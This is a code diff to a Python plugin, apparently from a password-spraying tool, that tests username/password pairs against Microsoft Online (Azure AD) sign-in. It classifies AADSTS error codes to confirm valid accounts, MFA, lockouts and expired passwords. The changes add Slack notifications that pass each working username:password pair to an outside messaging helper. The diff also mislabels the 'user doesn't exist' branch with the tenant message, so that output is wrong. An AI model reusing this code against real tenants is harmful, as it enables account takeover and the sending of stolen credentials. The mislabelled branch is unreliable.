@@ -1,7 +1,6 @@
 import datetime, requests
 import utils.utils as utils
 
-
 def msol_authenticate(url, username, password, useragent, pluginargs):
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
@@ -57,7 +56,8 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
 
         if resp.status_code == 200:
             data_response['success'] = True
-            data_response['output'] = f"SUCCESS! {resp.status_code} {username}:{password}"
+            data_response['output'] = utils.prGreen(f"[!] SUCCESS! {resp.status_code} {username}:{password}")
+            utils.slacknotify(username, password)
 
         else:
             response = resp.json()
@@ -65,22 +65,24 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
 
             if "AADSTS50126" in error:
                 data_response['success'] = False
-                data_response['output'] = f"FAILED. {resp.status_code} Invalid username or password. Username: {username} could exist."
+                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Invalid username or password. Username: {username} could exist.")
 
             elif "AADSTS50128" in error or "AADSTS50059" in error:
                 data_response['success'] = False
-                data_response['output'] = f"FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365"
+                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365")
 
             elif "AADSTS50034" in error:
                 data_response['success'] = False
-                data_response['output'] = f"FAILED. {resp.status_code} The user {username} doesn't exist."
+                data_response['output'] = utils.prRed(f'FAILED. {resp.status_code} Tenant for account {username} is not using AzureAD/Office365')
 
             elif "AADSTS50079" in error or "AADSTS50076" in error:
                 # Microsoft MFA response
                 data_response['2fa_enabled'] = True
                 data_response['success'] = True
                 data_response['code'] = "2FA Microsoft"
-                data_response['output'] = f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
+                data_response['output'] = utils.prYellow(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use.")
+                utils.slackupdate("The response indicates MFA (Microsoft) is in use.")
+                utils.slacknotify(username, password)
 
 
             elif "AADSTS50158" in error:
@@ -88,25 +90,27 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
                 data_response['2fa_enabled'] = True
                 data_response['success'] = True
                 data_response['code'] = "2FA Other"
-                data_response['output'] = f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
-
+                data_response['output'] = utils.prYellow(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
+                utils.slackupdate("The response indicates conditional access (MFA: DUO or other) is in use.")
+                utils.slacknotify(username, password)
 
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
                 data_response['success'] = False
-                data_response['output'] = f"WARNING! {resp.status_code} The account {username} appears to be locked."
+                data_response['output'] = utils.prYellow(f"WARNING! {resp.status_code} The account {username} appears to be locked.")
 
 
             elif "AADSTS50055" in error:
                 # User password is expired
                 data_response['change'] = True
                 data_response['success'] = True
-                data_response['output'] = f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The user's password is expired."
+                data_response['output'] = utils.prGreen(f"SUCCESS! {resp.status_code} {username}:{password} - NOTE: The user's password is expired.")
+                utils.slacknotify(username, password)
 
             else:
                 # Unknown errors
                 data_response['success'] = False
-                data_response['output'] = f"FAILED. {resp.status_code} Got an error we haven't seen yet for user {username}"
+                data_response['output'] = utils.prRed(f"FAILED. {resp.status_code} Got an error we haven't seen yet for user {username}")
 
     except Exception as ex:
         data_response['error'] = True
